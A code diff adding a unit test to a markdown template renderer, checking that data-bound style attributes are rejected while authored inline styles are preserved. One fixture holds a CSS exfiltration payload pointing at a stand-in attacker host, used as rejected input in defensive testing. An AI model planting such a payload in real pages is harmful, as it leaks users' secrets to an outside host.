@@ -442,6 +442,18 @@ Unavailable
     })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0031" })
   })
 
+  it("rejects bound CSS values while preserving authored styles", async () => {
+    await expect(renderMarkdownTemplate('<div :style="data.css">Content</div>', {
+      data: { css: "background:url(https://attacker.test/collect?secret=1)" },
+    })).rejects.toThrow("cannot target a style attribute")
+    await expect(renderMarkdownTemplate('<div style="color: red">Content</div>'))
+      .resolves.toContain('style="color: red"')
+    await expect(renderMarkdownTemplate('[Open](){:href="data.url" :style="data.css"}', {
+      data: { url: "https://example.com", css: "color: red" },
+    })).rejects.toThrow("cannot target a style attribute")
+
+  })
+
   it("preserves URL-like attributes on custom tags", async () => {
     await expect(renderMarkdownTemplate('<policy action="review now">Use it.</policy>'))
       .resolves.toBe('<policy action="review now">Use it.</policy>')
